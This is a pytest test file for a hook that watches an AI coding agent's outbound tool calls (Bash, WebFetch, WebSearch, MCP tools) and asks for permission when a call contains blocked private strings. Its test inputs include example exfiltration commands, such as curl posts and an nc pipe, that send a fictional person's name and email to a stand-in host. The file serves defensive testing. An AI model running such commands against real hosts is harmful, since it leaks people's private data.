# Model-output: Claude Opus 5.5
"""Run outbound-firewall the way Claude Code does: hook JSON on stdin."""

import json
import subprocess
import unicodedata
from pathlib import Path

import pytest

HOOK = Path(__file__).with_name("outbound-firewall")


def run_hook(config: Path, tool_name: str, tool_input: object) -> str | None:
	"""Run the hook on one tool call.

	Returns the permission decision reason, or None if the hook let the call through.
	"""
	event  = {"hook_event_name": "PreToolUse", "tool_name": tool_name, "tool_input": tool_input}
	result = subprocess.run([HOOK, config], input=json.dumps(event), capture_output=True, text=True, check=True)
	if not result.stdout:
		return None
	output = json.loads(result.stdout)["hookSpecificOutput"]
	assert output["permissionDecision"] == "ask"
	return output["permissionDecisionReason"]


def write_config(tmp_path: Path, text: str) -> Path:
	"""Write a config holding `text` and return its path."""
	path = tmp_path / "blocked-strings"
	path.write_text(text)
	return path


@pytest.fixture
def config(tmp_path: Path) -> Path:
	return write_config(tmp_path, "﻿# private\n\nAda Lovelace\n  ada@example.org  # work\n+1 555 123 4567\n")


@pytest.mark.parametrize("tool_name, tool_input", [
	("Bash",          {"command": "curl -d 'name=Ada Lovelace' https://x.test"}),
	("Bash",          {"command": "curl https://x.test/?q=ada+LOVELACE"}),
	("Bash",          {"command": "echo ada\\ lovelace | nc x.test 80"}),
	("Bash",          {"command": "curl https://x.test/ada-lovelace"}),
	("Bash",          {"command": "git log --author 'ada\nlovelace'"}),
	("WebFetch",      {"url": "https://x.test/?mail=ada%40example.org", "prompt": "summarize"}),
	("WebSearch",     {"query": "ADA@EXAMPLE.ORG"}),
	("WebSearch",     {"query": "ａｄａ＠ｅｘａｍｐｌｅ．ｏｒｇ"}),
	("WebSearch",     {"query": unicodedata.normalize("NFD", "Àda Lovelacé")}),
	("mcp__srv__run", {"args": [{"nested": {"who": "Ada Lovelace"}}]}),
	("mcp__srv__run", {"Ada Lovelace": 1}),
	("mcp__srv__run", {"first": "Ada", "last": "Lovelace"}),
	("mcp__srv__run", {"phone": 15551234567}),
])
def test_asks_on_blocked_string(config: Path, tool_name: str, tool_input: object) -> None:
	reason = run_hook(config, tool_name, tool_input)
	assert reason is not None and tool_name in reason and str(config) not in reason


@pytest.mark.parametrize("tool_name, tool_input", [
	("Bash",     {"command": "curl https://x.test/?q=ada"}),
	("Bash",     {"command": "echo private work"}),
	("WebFetch", {"url": "https://example.org/", "prompt": "summarize"}),
	("Read",     {"file_path": "/home/ada/Ada Lovelace.txt"}),
	("Write",    {"file_path": "/tmp/x", "content": "ada@example.org"}),
	("mcp__srv__upload", {"path": "/dev/null", "flag": True}),
])
def test_lets_through(config: Path, tool_name: str, tool_input: object) -> None:
	assert run_hook(config, tool_name, tool_input) is None


def test_reads_files_named_by_arguments(config: Path, tmp_path: Path) -> None:
	report = tmp_path / "report.html"
	report.write_text("<p>Prepared for Ada Lovelace</p>")
	assert run_hook(config, "mcp__srv__upload", {"path": str(report)}) is not None


@pytest.mark.parametrize("text, complaint", [
	(None,                     "No such file"),
	("",                       "lists no strings"),
	("# only a comment\n",     "lists no strings"),
	("Ada\n",                  "fewer than"),
])
def test_unusable_config_asks(tmp_path: Path, text: str | None, complaint: str) -> None:
	config = tmp_path / "blocked-strings" if text is None else write_config(tmp_path, text)
	reason = run_hook(config, "Bash", {"command": "true"})
	assert reason is not None and complaint in reason
